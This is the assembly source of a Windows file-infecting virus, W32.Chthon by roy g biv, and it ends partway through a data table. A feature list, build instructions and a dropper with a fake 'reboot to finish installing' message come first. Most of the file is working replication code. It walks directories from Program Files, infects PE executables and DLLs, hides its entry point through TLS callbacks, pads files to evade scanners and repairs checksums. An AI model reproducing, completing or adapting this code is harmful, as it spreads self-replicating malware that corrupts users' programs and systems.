
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[CHTHON.ASM]컴�
comment ;)
W32.Chthon by roy g biv

some of its features:
- native executable - runs before GUI loads so also before any other files
- parasitic direct action infector of PE exe/dll (but not looking at suffix)
- infects files in current directory and all subdirectories
- directory traversal is linked-list instead of recursive to reduce stack size
- reloc section inserter/last section appender
- weird EPO (TLS code used to drop file which contains replication code)
- 100% Unicode function (because is for NT/2000/XP OS only)
- uses CRCs instead of API names
- uses SEH for common code exit
- section attributes are not always altered (virus is not self-modifying)
- no infect files with data outside of image (eg self-extractors)
- infected files are padded by random amounts to confuse tail scanners
- uses SEH walker to find kernel, uses import for ntdll (no hard-coded addresses)
- correct file checksum without using imagehlp.dll :) 100% correct algorithm
- plus some new code optimisations that were never seen before W32.Shrug :)

combined W32.Shrug and W32.OU812 that infects host file using a new technique

known bugs:
- no SFC/SFP support.  why?  because it is not available to native files
---

  optimisation tip: Windows appends ".dll" automatically, so this works:
        push "cfs"
        push esp
        call LoadLibraryA
---

to build this thing:
tasm
----
tasm32 /ml /m3 chthon
tlink32 /B:400000 /x chthon,,,import32

Virus is not self-modifying, so no need to alter section attributes
---

We're in the middle of a phase transition:
a butterfly flapping its wings at
just the right moment could
cause a storm to happen.
-I'm trying to understand-
I'm at a moment in my life-
I don't know where to flap my wings.
(Danny Hillis)

(;

.386
.model	flat

extern	GetCurrentProcess:proc
extern	WriteProcessMemory:proc
extern  MessageBoxA:proc
extern  ExitProcess:proc

.data

;must be reverse alphabetical order because they are stored on stack
;API names are not present in replications, only in dropper

krnnames        db      "RtlSetCurrentDirectory_U"    , 0
                db      "RtlRandom"                   , 0
                db      "RtlFreeHeap"                 , 0
                db      "RtlDosPathNameToNtPathName_U", 0
                db      "RtlAllocateHeap"             , 0
                db      "NtUnmapViewOfSection"        , 0
                db      "NtSetInformationFile"        , 0
                db      "NtQueryDirectoryFile"        , 0
                db      "NtOpenFile"                  , 0
                db      "NtMapViewOfSection"          , 0
                db      "NtCreateSection"             , 0
                db      "NtClose"                     , 0

exenames        db      "WriteFile"            , 0
                db      "SetFileAttributesA"   , 0
                db      "MoveFileA"            , 0
                db      "LoadLibraryA"         , 0
                db      "GlobalFree"           , 0
                db      "GlobalAlloc"          , 0
                db      "GetWindowsDirectoryA" , 0
                db      "GetTickCount"         , 0
                db      "GetTempFileNameA"     , 0
                db      "GetFileAttributesA"   , 0
                db      "DeleteFileA"          , 0
                db      "CreateFileA"          , 0
                db      "CloseHandle"          , 0

regnames        db      "RegSetValueExA", 0
                db      "RegOpenKeyA"   , 0
                db      "RegCloseKey"   , 0

sysname         equ     "chthon"                ;must be < 8 bytes long else code change

txttitle        db      sysname, 0
txtbody         db      "Please reboot to finish installing ;)", 0

include chthon.inc

.code
assume fs:nothing
dropper 	label	near
        mov     edx, krncrc_count
        mov     ebx, offset krnnames
        mov     edi, offset krncrcbegin
        call    create_crcs
        mov     edx, execrc_count
        mov     ebx, offset exenames
        mov     edi, offset execrcbegin
        call    create_crcs
        mov     edx, regcrc_count
        mov     ebx, offset regnames
        mov     edi, offset regcrcbegin
        call    create_crcs
        call    patch_host
        xor     ebx, ebx
        push    ebx
        push    offset txttitle
        push    offset txtbody
        push    ebx
        call    MessageBoxA
        push    ebx
        call    ExitProcess

create_crcs     proc    near
        imul    ebp, edx, 4

create_loop     label   near
        or      eax, -1

create_outer    label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

create_inner    label   near
        add     eax, eax
        jnb     create_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

create_skip     label   near
        loop    create_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      create_outer
        push    eax
        dec     edx
        jne     create_loop
        mov     eax, esp
        push    ecx
        push    ebp
        push    eax
        push    edi
        call    GetCurrentProcess
        push    eax
        xchg    esi, eax
        call    WriteProcessMemory
        add     esp, ebp
        ret
create_crcs     endp

patch_host      label   near
        pop     ecx
        push    ecx
        call    $ + 5
        pop     eax
        add     eax, offset host_patch - offset $ + 1
        sub     ecx, eax
        push    ecx
        mov     eax, esp
        xor     edi, edi
        push    edi
        push    4
        push    eax
        push    offset host_patch + 3
        push    esi
        call    WriteProcessMemory
        push    edi                             ;fake Reserved
        push    edi                             ;fake Reason
        push    edi                             ;fake DLLHandle
        push    edi                             ;fake return address
        jmp     chthon_tlscode
;-----------------------------------------------------------------------------
;everything before this point is dropper code
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;virus code begins here
;-----------------------------------------------------------------------------

chthon_begin    proc    near
        enter   (size findlist - 5) and -4, 0   ;Windows NT/2000/XP enables alignment check exception
						;so some APIs fail if buffer is not dword aligned
                                                ;-5 to align at 2 dwords earlier
						;because EBP saved automatically
                                                ;and other register saved next
        push    0                               ;zero findprev in findlist
        mov     edi, dword ptr ds:[40102ch]     ;understand this before you think to change it!
        call    find_mzhdr

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (krncrc_count + 1) dup (0)
krncrcend       label   near
        dd      offset get_heaphand - offset krncrcend + 4
        db      "Chthon - roy g biv"            ;trust me - I'm a local
tlsdata         tlsstruc <0>

;-----------------------------------------------------------------------------
;moved label after some data because "e800000000" looks like virus code ;)
;-----------------------------------------------------------------------------

find_mzhdr      label   near

;-----------------------------------------------------------------------------
;do not use hard-coded kernel address values because it is not portable
;Microsoft used all different values for 95, 98, NT, 2000, Me, XP
;they will maybe change again for every new release
;-----------------------------------------------------------------------------

        dec     edi                             ;sub 64kb
        xor     di, di                          ;64kb align
        call    is_pehdr
        jne     find_mzhdr
        mov     ebx, edi
        pop     edi

;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

        mov     esi, dword ptr [esi + pehdr.peexport.dirrva - pehdr.pecoff]
        lea     esi, dword ptr [ebx + esi + peexp.expadrrva]
        lods    dword ptr [esi]                 ;Export Address Table RVA
        lea     edx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Name Pointer Table RVA
        lea     ecx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Ordinal Table RVA
        lea     ebp, dword ptr [ebx + eax]
        mov     esi, ecx

push_export     label   near
        push    ecx

get_export      label   near
        lods    dword ptr [esi]
        push    ebx
        add     ebx, eax                        ;Name Pointer VA
        or      eax, -1

crc_outer       label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

crc_inner       label   near
        add     eax, eax
        jnb     crc_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

crc_skip        label   near
        loop    crc_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      crc_outer
        pop     ebx
        cmp     dword ptr [edi], eax
        jne     get_export

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        pop     ecx
        mov     eax, esi
        sub     eax, ecx                        ;Name Pointer Table VA
        shr     eax, 1
        movzx   eax, word ptr [ebp + eax - 2]   ;get export ordinal
        mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
        add     eax, ebx
        push    eax
        scas    dword ptr [edi]
        cmp     dword ptr [edi], 0
        jne     push_export
        add     edi, dword ptr [edi + 4]
        jmp     edi

get_heaphand    label   near
        mov     ebx, esp
        lea     esi, dword ptr [ebx + size krncrcstk]
	mov	eax, dword ptr fs:[tib.TibTeb]
	mov	edi, dword ptr [eax + teb.heaphand]

;-----------------------------------------------------------------------------
;set initial scanning directory (Windows directory takes too long), but
;if initial directory is not existing, then Windows directory will be used
;-----------------------------------------------------------------------------

        call    init_dire

init_dirb       label   near
        dw      "\", "p", "r", "o", "g", "r", "a", "m", " ", "f", "i", "l", "e", "s", 0

init_dire       label   near
        push    offset init_dire - offset init_dirb
	push	esp
        call    dword ptr [ebx + krncrcstk.kRtlSetCurrentDirectory_U]
        pop     eax
        pop     eax

;-----------------------------------------------------------------------------
;non-recursive directory traverser
;-----------------------------------------------------------------------------

scan_dir	label	near
	push	'*'
	mov	eax, esp
	lea	ecx, dword ptr [esi + findlist.findmask]
	push	ecx
	push	eax
	lea	ecx, dword ptr [esi + findlist.findname]
	push	ecx
	push	eax
        call    dword ptr [ebx + krncrcstk.kRtlDosPathNameToNtPathName_U]
	pop	eax
	xor	ecx, ecx
	push	ecx
	push	ecx
	push	ecx
	lea	eax, dword ptr [esi + findlist.findname.UniLength]
	sub	dword ptr [eax], 4		;no count "\??\"
	push	eax
	push	ecx
	push	size OBJECT_ATTRIBUTES
	mov	eax, esp
	push	FILE_DIRECTORY_FILE or FILE_SYNCHRONOUS_IO_NONALERT or FILE_OPEN_FOR_BACKUP_INTENT
	push	FILE_SHARE_READ or FILE_SHARE_WRITE
	push	esp
	push	eax
	push	FILE_LIST_DIRECTORY or SYNCHRONIZE
	lea	eax, dword ptr [esi + findlist.findhand]
	push	eax
        call    dword ptr [ebx + krncrcstk.kNtOpenFile]
	add	esp, size OBJECT_ATTRIBUTES
	test	eax, eax
	jl	find_prev
	lea	ebp, dword ptr [esi + findlist.findmask]

find_next	label	near
	push	0
	push	ebp
	push	esp				;non-zero
	push	FileBothDirectoryInformation
	push	size FILE_DIRECTORY_INFORMATION
	lea	eax, dword ptr [esi + findlist.finddata]
	push	eax
	push	esp
	xor	ebp, ebp
	push	ebp
	push	ebp
	push	ebp
	push	dword ptr [esi + findlist.findhand]
        call    dword ptr [ebx + krncrcstk.kNtQueryDirectoryFile]
	test	eax, eax
	jl	find_prev

        ;you must always step forward from where you stand

        mov     ecx, dword ptr [esi + findlist.finddata.dirFileNameLength]
        lea     eax, dword ptr [esi + findlist.finddata.dirFileName]
        mov     dword ptr [eax + ecx], ebp
	test	byte ptr [esi + findlist.finddata.dirFileAttributes], FILE_ATTRIBUTE_DIRECTORY
	je	test_file
        cmp     byte ptr [eax], '.'             ;ignore . and .. (but also .* directories under NT/2000/XP)
	je	find_next

;-----------------------------------------------------------------------------
;enter subdirectory, and allocate another list node
;-----------------------------------------------------------------------------

	push	eax
        push    ecx
	push	esp
        call    dword ptr [ebx + krncrcstk.kRtlSetCurrentDirectory_U]
	test	eax, eax
	pop	eax
	pop	eax
	jl	find_next
	push	offset size findlist
	push	ebp
	push	edi
        call    dword ptr [ebx + krncrcstk.kRtlAllocateHeap]
	xchg	ecx, eax
	jecxz	step_updir
	xchg	esi, ecx
	mov	dword ptr [esi], ecx
	jmp	scan_dir
        org     $ - 2                           ;select top 16 bits of jump
chthon_exit     label   near                    ;game over
        org     $ + 2

;-----------------------------------------------------------------------------
;close find, and free list node if not list head
;-----------------------------------------------------------------------------

find_prev	label	near
	push	dword ptr [esi + findlist.findhand]
        call    dword ptr [ebx + krncrcstk.kNtClose]
	push	dword ptr [esi + findlist.findname.Buffer]
	push	ebp
	push	edi
        call    dword ptr [ebx + krncrcstk.kRtlFreeHeap]
	mov	ecx, dword ptr [esi + findlist.findprev]
        jecxz   chthon_exit
	push	esi
	mov	esi, ecx
	push	ebp
	push	edi
        call    dword ptr [ebx + krncrcstk.kRtlFreeHeap]

step_updir	label	near
	push	ebp
	push	'.' shl 10h + '.'
	push	esp
	push	2
	push	esp
        call    dword ptr [ebx + krncrcstk.kRtlSetCurrentDirectory_U]
	add	esp, size UNICODE_STRING + 8
	jmp	find_next

test_file	label	near
        push    ebx
	push	edi
	push	eax
        push    ecx
	mov	eax, esp
	push	ebp
	push	ebp
	push	ebp
	push	eax
	push	dword ptr [esi + findlist.findmask.RootDir]
	push	size OBJECT_ATTRIBUTES
	mov	ebx, esp
	push	eax
	mov	eax, esp
	push	FILE_SYNCHRONOUS_IO_NONALERT or FILE_OPEN_FOR_BACKUP_INTENT
	push	ebp
	push	esp
	push	ebx
	push	FILE_WRITE_ATTRIBUTES or SYNCHRONIZE
	push	eax
        call    dword ptr [ebx + size openstk + krncrcstk.kNtOpenFile]
	pop	ecx
	push	ecx
	push	ebp
        push    FILE_ATTRIBUTE_ARCHIVE
	push	ebp
	push	ebp
	push	ebp
	push	ebp
	push	ebp
	push	ebp
	push	ebp
	push	ebp
	mov	eax, esp
	push	FileBasicInformation
	push	size FILE_BASIC_INFORMATION
	push	eax
	push	esp
	push	ecx
        call    dword ptr [ebx + size openstk + krncrcstk.kNtSetInformationFile]
	add	esp, size FILE_BASIC_INFORMATION
        call    dword ptr [ebx + size openstk + krncrcstk.kNtClose]
	push	eax
	mov	eax, esp
	push	FILE_SYNCHRONOUS_IO_NONALERT or FILE_OPEN_FOR_BACKUP_INTENT
	push	ebp
	push	esp
	push	ebx
	push	FILE_READ_DATA or FILE_WRITE_DATA or FILE_APPEND_DATA or FILE_WRITE_ATTRIBUTES or SYNCHRONIZE
	push	eax
        call    dword ptr [ebx + size openstk + krncrcstk.kNtOpenFile]
	call	test_infect
	db	81h				;mask CALL
	call	infect_file			;Super Nashwan power ;)

;-----------------------------------------------------------------------------
;file time and attributes can be set with single call to NtSetInformationFile
;-----------------------------------------------------------------------------

close_file	label	near			;label required for delta offset
	pop	ecx
	push	ecx
	mov	eax, dword ptr [esi + findlist.finddata.dirFileAttributes]
	mov	dword ptr [esi + findlist.finddata.dirRealFileSize.dwordLow], eax
	push	FileBasicInformation
	push	size FILE_BASIC_INFORMATION
	lea	eax, dword ptr [esi + findlist.finddata.dirCreationTime]
	push	eax
	push	esp
	push	ecx
        call    dword ptr [ebx + size openstk + krncrcstk.kNtSetInformationFile]
        call    dword ptr [ebx + size openstk +  krncrcstk.kNtClose]
	add	esp, size OBJECT_ATTRIBUTES + size UNICODE_STRING
	pop	edi
        pop     ebx
	jmp	find_next

;-----------------------------------------------------------------------------
;look for MZ and PE file signatures
;-----------------------------------------------------------------------------

is_pehdr	proc	near			;edi -> map view
	cmp	word ptr [edi], 'ZM'            ;Windows does not check 'MZ'
	jne	pehdr_ret
	mov	esi, dword ptr [edi + mzhdr.mzlfanew]
	add	esi, edi
	lods	dword ptr [esi] 		;SEH protects against bad lfanew value
	add	eax, -'EP'                      ;anti-heuristic test filetype ;) and clear EAX

pehdr_ret	label	near
	ret					;if PE file, then eax = 0, esi -> COFF header, Z flag set
	db	"11/11/01"
is_pehdr	endp

;-----------------------------------------------------------------------------
;test if file is infectable (not protected, PE, x86, non-system, not infected, etc)
;-----------------------------------------------------------------------------

test_infect	proc	near			;esi = find data, edi = map view
	call	map_view
	mov	ebp, esi
	call	is_pehdr
	jne	inftest_ret
	lods	dword ptr [esi]
	cmp	ax, IMAGE_FILE_MACHINE_I386
	jne	inftest_ret			;only Intel 386+
	shr	eax, 0dh			;move high 16 bits into low 16 bits and multiply by 8
	lea	edx, dword ptr [eax * 4 + eax]	;complete multiply by 28h (size pesect)
	mov	ecx, dword ptr [esi + pehdr.pecoff.peflags - pehdr.pecoff.petimedate]

;-----------------------------------------------------------------------------
;IMAGE_FILE_BYTES_REVERSED_* bits are rarely set correctly, so do not test them
;-----------------------------------------------------------------------------

	test	ch, (IMAGE_FILE_SYSTEM or IMAGE_FILE_UP_SYSTEM_ONLY) shr 8
	jne	inftest_ret
	add	esi, pehdr.peentrypoint - pehdr.pecoff.petimedate

;-----------------------------------------------------------------------------
;if file is a .dll, then we require an entry point function
;-----------------------------------------------------------------------------

	lods	dword ptr [esi]
	xchg	ecx, eax
	test	ah, IMAGE_FILE_DLL shr 8
	je	test_system
	jecxz	inftest_ret

;-----------------------------------------------------------------------------
;32-bit executable file...
;-----------------------------------------------------------------------------

test_system	label	near
	and	ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
	cmp	ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
	jne	inftest_ret			;cannot use xor+jpo because 0 is also jpe

;-----------------------------------------------------------------------------
;the COFF magic value is not checked because Windows ignores it anyway
;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+
;-----------------------------------------------------------------------------

	mov	eax, dword ptr [esi + pehdr.pesubsys - pehdr.pecodebase]
	cmp	ax, IMAGE_SUBSYSTEM_WINDOWS_CUI
	jnbe	inftest_ret
	cmp	al, IMAGE_SUBSYSTEM_WINDOWS_GUI ;al not ax, because ah is known now to be 0
	jb	inftest_ret
	shr	eax, 1eh			;test eax, IMAGE_DLLCHARACTERISTICS_WDM_DRIVER shl 10h
	jb	inftest_ret

;-----------------------------------------------------------------------------
;avoid files which seem to contain attribute certificates
;because one of those certificates might be a digital signature
;-----------------------------------------------------------------------------

	cmp	dword ptr [esi + pehdr.pesecurity.dirrva - pehdr.pecodebase], 0
	jne	inftest_ret

;-----------------------------------------------------------------------------
;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size
;the Optional Header can be larger than the offset of the last directory
;remember: even if you have not seen it does not mean that it does not happen :)
;-----------------------------------------------------------------------------

	movzx	eax, word ptr [esi + pehdr.pecoff.peopthdrsize - pehdr.pecodebase]
	add	eax, edx
	lea	esi, dword ptr [esi + eax - pehdr.pecodebase + pehdr.pemagic - size pesect + pesect.sectrawsize]
	lods	dword ptr [esi]
	add	eax, dword ptr [esi]
	cmp	dword ptr [ebp + findlist.finddata.dirRealFileSize], eax
	jne	inftest_ret			;file contains appended data
        inc     dword ptr [esp + mapsehstk.mapsehinfret]
						;skip call mask

inftest_ret	label	near
	int	3

;-----------------------------------------------------------------------------
;increase file size by random value (between RANDPADMIN and RANDPADMAX bytes)
;I use RtlRandom() instead of RDTSC because RDTSC can be made privileged
;-----------------------------------------------------------------------------

open_append	proc	near
	push	esi
	push	esp
        call    dword ptr [ebx + size openstk + krncrcstk.kRtlRandom]
	pop	ecx
	and	eax, RANDPADMAX - 1
        add     ax, small (offset chthon_codeend - offset chthon_begin + RANDPADMIN)
	add	dword ptr [esi + findlist.finddata.dirRealFileSize], eax

;-----------------------------------------------------------------------------
;create file map, and map view if successful
;-----------------------------------------------------------------------------

map_view	proc	near			;ebx -> APIs, esi -> findlist, ebp = 0
        mov     eax, dword ptr [esi + findlist.finddata.dirRealFileSize]
        push    eax
        push    dword ptr [esi + findlist.finddata.dirRealFileSize.dwordHigh]
        push    eax
        mov     eax, esp
	push	ebp
        mov     ecx, esp
	push	PAGE_READWRITE			;NtMapViewOfSection
	push	ebp				;NtMapViewOfSection
	push	1				;NtMapViewOfSection
        push    eax                             ;NtMapViewOfSection
	lea	edx, dword ptr [esp - 0ch]
	push	edx				;NtMapViewOfSection
	push	ebp				;NtMapViewOfSection
	push	ebp				;NtMapViewOfSection
        push    ecx                             ;NtMapViewOfSection
	push	-1				;NtMapViewOfSection
	push	eax				;NtMapViewOfSection
	push	dword ptr [ebx - 4]
	push	08000000h
	push	PAGE_READWRITE
        push    eax
	push	ebp
	push	STANDARD_RIGHTS_REQUIRED or SECTION_QUERY or SECTION_MAP_WRITE or SECTION_MAP_READ
        lea     ecx, dword ptr [edx - 0ch]
	push	ecx
        call    dword ptr [ebx + size openstk + krncrcstk.kNtCreateSection]
	pop	edi
	push	edi
        call    dword ptr [ebx + size openstk + krncrcstk.kNtMapViewOfSection]
	pop	eax
	pop	ecx
        pop     ecx
        pop     ecx
	xchg	edi, eax			;should succeed even if file cannot be opened
	pushad
	call	unmap_seh
	mov	esp, dword ptr [esp + 8]
	xor	eax, eax
	pop	dword ptr fs:[eax]
	pop	eax
	popad					;SEH destroys all registers
	push	eax
	push	edi
	push	-1
        call    dword ptr [ebx + size openstk + krncrcstk.kNtUnmapViewOfSection]
        call    dword ptr [ebx + size openstk + krncrcstk.kNtClose]
	pop	eax
	ret

unmap_seh	proc	near
	cdq
	push	dword ptr fs:[edx]
	mov	dword ptr fs:[edx], esp
	jmp	dword ptr [esp + 28h]
unmap_seh	endp
map_view	endp				;eax = map handle, ecx = new file size, edi = map view
open_append	endp

;-----------------------------------------------------------------------------
;infect file using a selection of styles for variety, using two parts
;algorithm:	increase file size by random amount (RANDPADMIN-RANDPADMAX
;		bytes) to confuse scanners that look at end of file (also
;		infection marker)
;		if reloc table is not in last section (taken from relocation
;		field in PE header, not section name), then append to last
;		section.  otherwise, move relocs down and insert code into
;		space (to confuse people looking at end of file.  they will
;		see only relocation data and garbage or many zeroes)
;DLL infection: entry point is altered to point to some code.  very simple
;EXE infection: Entry Point Obscured via TLS callback function
;		if no TLS directory exists, then one will be created, with a
;		single callback function that points to this code
;		if a TLS directory exists, but no callback functions exist,
;		then a function pointer will be created that points to this
;		code
;		else if a TLS directory and callback functions exist, then the
;		first function pointer will be altered to point to this code
;               however, that code just drops exe, alters registry and returns
;               exe contains virus code which replicates on reboot
;-----------------------------------------------------------------------------

infect_file     label   near                    ;esi -> findlist, edi = map view
        call    open_append

delta_label	label	near
	push	ecx
	push	edi
	mov	ebx, dword ptr [edi + mzhdr.mzlfanew]
	lea	ebx, dword ptr [ebx + edi + pehdr.pechksum]
	movzx	eax, word ptr [ebx + pehdr.pecoff.pesectcount - pehdr.pechksum]
	imul	eax, eax, size pesect
	movzx	ecx, word ptr [ebx + pehdr.pecoff.peopthdrsize - pehdr.pechksum]
	add	eax, ecx
	lea	esi, dword ptr [ebx + eax + pehdr.pemagic - pehdr.pechksum - size pesect + pesect.sectrawsize]
	lods	dword ptr [esi]
        mov     cx, offset chthon_codeend - offset chthon_begin
	mov	edx, dword ptr [ebx + pehdr.pefilealign - pehdr.pechksum]
	push	eax
	add	eax, ecx
	dec	edx
	add	eax, edx
	not	edx
	and	eax, edx			;file align last section
	mov	dword ptr [esi + pesect.sectrawsize - pesect.sectrawaddr], eax

;-----------------------------------------------------------------------------
;raw size is file aligned.  virtual size is not required to be section aligned
;so if old virtual size is larger than new raw size, then size of image does
;not need to be updated, else virtual size must be large enough to cover the
;new code, and size of image is section aligned
;-----------------------------------------------------------------------------

	mov	ebp, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
	cmp	dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
	jnb	test_reloff
	mov	dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
	add	eax, ebp
	mov	edx, dword ptr [ebx + pehdr.pesectalign - pehdr.pechksum]
	dec	edx
	add	eax, edx
	not	edx
	and	eax, edx
	mov	dword ptr [ebx + pehdr.peimagesize - pehdr.pechksum], eax

;-----------------------------------------------------------------------------
;if relocation table is not in last section, then append to last section
;otherwise, move relocations down and insert code into space
;-----------------------------------------------------------------------------

test_reloff	label	near
	test	byte ptr [ebx + pehdr.pecoff.peflags - pehdr.pechksum], IMAGE_FILE_RELOCS_STRIPPED
	jne	copy_code
	cmp	dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ebp
	jb	copy_code
	mov	eax, dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr]
	add	eax, ebp
	cmp	dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], eax
	jnb	copy_code
	add	dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ecx
	pop	eax
	push	esi
	add	edi, dword ptr [esi]
	lea	esi, dword ptr [edi + eax - 1]
	lea	edi, dword ptr [esi + ecx]
	xchg	ecx, eax
	std
	rep	movs byte ptr [edi], byte ptr [esi]
	cld
	pop	esi
	pop	edi
	push	edi
	push	ecx
	xchg	ecx, eax

copy_code	label	near
	pop	edx
	add	ebp, edx
	xchg	ebp, eax
	add	edx, dword ptr [esi]
	add	edi, edx
	push	esi
	push	edi
        mov     esi, offset chthon_begin - offset delta_label
        add     esi, dword ptr [esp + infectstk.infseh.mapsehinfret]
						;delta offset
	rep	movs byte ptr [edi], byte ptr [esi]
	pop	edi
	pop	esi

;-----------------------------------------------------------------------------
;always alter entry point of dlls
;-----------------------------------------------------------------------------

	test	byte ptr [ebx + pehdr.pecoff.peflags - pehdr.pechksum + 1], IMAGE_FILE_DLL shr 8
	je	test_tlsdir
	lea	edx, dword ptr [ebx + pehdr.peentrypoint - pehdr.pechksum]

alter_func	label	near
        add     eax, offset chthon_tlscode - offset chthon_begin
	xchg	dword ptr [edx], eax
        sub     eax, offset host_patch - offset chthon_tlscode
	sub	eax, dword ptr [edx]
        mov     dword ptr [edi + offset host_patch - offset chthon_begin + 3], eax
	jmp	checksum_file

;-----------------------------------------------------------------------------
;if tls directory exists...
;-----------------------------------------------------------------------------

test_tlsdir	label	near
	mov	ecx, dword ptr [ebx + pehdr.petls.dirrva - pehdr.pechksum]
	jecxz	add_tlsdir			;size field is never checked
	call	rva2raw
	pop	edx
	push	edx
	add	eax, dword ptr [ebx + pehdr.peimagebase - pehdr.pechksum]
	push	eax
        lea     eax, dword ptr [edx + ecx + tlsstruc.tlsfuncptr]
	mov	ecx, dword ptr [eax]
	jecxz	store_func
	sub	ecx, dword ptr [ebx + pehdr.peimagebase - pehdr.pechksum]
	call	rva2raw
	add	edx, ecx			;do not combine
	mov	ecx, dword ptr [edx]		;current edx used by alter_func

	;it is impossible if it passes unattempted

store_func	label	near
	test	ecx, ecx
	pop	ecx
	xchg	ecx, eax
	jne	alter_func
        add     eax, offset tlsdata.tlsfunc - offset chthon_begin
	mov	dword ptr [ecx], eax
        add     edi, offset tlsdata.tlsfiller - offset chthon_begin
	jmp	set_funcptr

;-----------------------------------------------------------------------------
;the only time that the section attributes are altered is when a TLS directory
;is created.  at that time, a writable dword must be available for the index.
;the alternative is to search for a writable section with virtual size > raw
;size, set index pointer to that address and reinitialise it to zero in code
;-----------------------------------------------------------------------------

add_tlsdir	label	near
	or	byte ptr [esi + pesect.sectflags - pesect.sectrawaddr + 3], IMAGE_SCN_MEM_WRITE shr 18h
        add     eax, offset tlsdata - offset chthon_begin
	mov	dword ptr [ebx + pehdr.petls.dirrva - pehdr.pechksum], eax
	add	eax, dword ptr [ebx + pehdr.peimagebase - pehdr.pechksum]
        add     eax, offset tlsdata.tlsflags - offset tlsdata
        add     edi, offset tlsdata.tlsindex - offset chthon_begin
	stos	dword ptr [edi]
        add     eax, offset tlsdata.tlsfunc - offset tlsdata.tlsflags
	stos	dword ptr [edi]

set_funcptr	label	near
	scas	dword ptr [edi]
	scas	dword ptr [edi]
        add     eax, offset chthon_dllcode - offset tlsdata.tlsfunc
	stos	dword ptr [edi]

checksum_file	label	near
	pop	edi

;-----------------------------------------------------------------------------
;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
;-----------------------------------------------------------------------------

	xor	ecx, ecx
	xchg	dword ptr [ebx], ecx
	jecxz	infect_ret
	xor	eax, eax
	pop	ecx
	push	ecx
	inc	ecx
	shr	ecx, 1
	clc

calc_checksum	label	near
	adc	ax, word ptr [edi]
	inc	edi
	inc	edi
	loop	calc_checksum
	pop	dword ptr [ebx]
	adc	dword ptr [ebx], eax		;avoid common bug.  ADC not ADD

infect_ret	label	near
	int	3				;common exit using SEH
	db	"*4U2NV*"                       ;that is, unless you're reading this
test_infect	endp

;-----------------------------------------------------------------------------
;convert relative virtual address to raw file offset
;-----------------------------------------------------------------------------

rvaloop 	label	near
	sub	esi, size pesect
	cmp	al, 'R'                         ;mask PUSH ESI
	org	$ - 1
rva2raw 	proc	near			;ecx = RVA, esi -> last section header
	push	esi
	cmp	dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr], ecx
	jnbe	rvaloop
	sub	ecx, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
	add	ecx, dword ptr [esi]
	pop	esi
	ret
rva2raw        endp

	;When last comes to last,
	;  I have little power:
	;  I am merely an urn.
	;I hold the bone-sap of myself,
	;  And watch the marrow burn.
	;
	;When last comes to last,
	;  I have little strength:
	;  I am only a tool.
	;I work its work; and in its hands
	;  I am the fool.
	;
	;When last comes to last,
	;  I have little life.
	;  I am simply a deed:
	;an action done while courage holds:
	;  A seed.
	;(Stephen Donaldson)

;-----------------------------------------------------------------------------
;virus code begins here in dlls (always) and exes (existing TLS callback pointer)
;-----------------------------------------------------------------------------

chthon_tlscode  proc    near
        mov     eax, dword ptr [esp + initstk.initReason]
        push    eax                             ;fake Reserved
        push    eax                             ;real Reason
        push    eax                             ;fake DLLHandle
        call    host_patch                      ;real return address

host_patch      label   near
        add     dword ptr [esp], '!bgr'

;-----------------------------------------------------------------------------
;virus code begins here in exes (created TLS directory / callback pointer)
;-----------------------------------------------------------------------------

chthon_dllcode  proc    near                    ;stack = DllHandle, Reason, Reserved
        test    byte ptr [esp + initstk.initReason], DLL_PROCESS_ATTACH or DLL_THREAD_ATTACH
        jne     chthon_dllret                   ;kernel32 not in SEH chain on ATTACH messages
        pushad
        xor     esi, esi
        lods    dword ptr fs:[esi]
        inc     eax

walk_seh        label   near
        dec     eax
        xchg    esi, eax
        lods    dword ptr [esi]
        inc     eax
        jne     walk_seh
        mov     edi, dword ptr [esi]
        call    find_mzhdr

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

execrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (execrc_count + 1) dup (0)
execrcend       label   near
        dd      offset drop_sys - offset execrcend + 4

chthon_dllret   label   near
        ret     0ch

syslabel        label   near
        db      sysname, ".exe"
        db      0ch - (offset $ - offset syslabel) dup (0)

syssize equ     94h
;RLE-based compressed MZ header, PE header, section table, import table
        dd      11111111110000011100001011100000b
        ;       mmmmmmmmmmz   01mmz   02mmm
        db      'M', 'Z', "ntdll.dll", 'P', 'E', 4ch, 1, 1
        dd      00000110000111100001001010010000b
        ;       z   01mz   03mmz   02r   04m
        db      2, 2ch, 10h, 40h
        dd      00000111110100100001001000111110b
        ;       z   01mmmmr   02z   04mz   07mm
